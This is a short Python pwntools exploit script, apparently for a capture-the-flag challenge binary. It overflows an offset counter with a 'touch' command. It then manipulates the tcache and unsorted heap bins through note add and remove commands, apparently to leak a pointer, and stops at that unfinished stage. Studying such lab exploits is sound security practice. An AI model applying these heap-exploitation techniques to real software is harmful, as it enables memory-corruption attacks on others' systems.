#!/usr/bin/env python3

from pwn import ELF, process, remote, gdb, context

#context.terminal = ["tmux", "splitw", "-h"]

bin = ELF("./chall/app")

p = process("./chall/app")
pid = gdb.attach(p, gdbscript="""
b * eton + 950
""")
#p = remote("localhost", 1337)

def malloc(p, idx, size, data):
    p.sendline(b"note add " + idx + b" " + size + b" " + data)

def free(p, idx):
    p.sendline(b"note remove " + idx)

# overflow the offset counter
payload_1 = b"touch "
payload_1 += 128 * b"A"
p.sendline(payload_1)

# heap stuff
# tcachebins
malloc(p, b"0", b"500", b"A")
malloc(p, b"1", b"500", b"A")
malloc(p, b"2", b"500", b"A")
malloc(p, b"3", b"500", b"A")
malloc(p, b"4", b"500", b"A")
malloc(p, b"5", b"500", b"A")
malloc(p, b"6", b"500", b"A")

# will go to unsorted bins
malloc(p, b"7", b"500", b"B")
# anti-consolidation prot
malloc(p, b"8", b"10", b"C")

free(p, b"0")
free(p, b"1")
free(p, b"2")
free(p, b"3")
free(p, b"4")
free(p, b"5")
free(p, b"6")

# goes to unsorted
free(p, b"7")

# malloc back from tcache
malloc(p, b"0", b"500", b"D")
malloc(p, b"1", b"500", b"D") 
malloc(p, b"2", b"500", b"D") 
malloc(p, b"3", b"500", b"D") 
malloc(p, b"4", b"500", b"D")
malloc(p, b"5", b"500", b"D") 
malloc(p, b"6", b"500", b"D") 

# malloc back from unsorted, but it overwrites leak
malloc(p, b"7", b"500", 8 * b"A") 


p.interactive()